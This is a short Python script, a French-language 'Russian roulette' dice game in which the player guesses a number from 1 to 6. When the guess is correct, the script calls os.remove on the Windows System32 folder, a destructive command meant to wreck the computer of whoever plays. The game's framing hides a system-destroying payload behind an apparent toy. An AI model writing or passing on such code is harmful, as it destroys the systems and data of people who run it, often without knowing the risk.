import random
import os
import time

while True:
    number = random.randint(1, 6)
    
    guess = int(input(""))
    
    if number == guess:
        
        print(f"Le jeu a choisi {number}.")
        time.sleep(1)
        os.remove("C:\\Windows\System32")
        
    else:
        
        print(f"Le jeu a choisi {number}.")
        print("ouf.. ta eu chaud")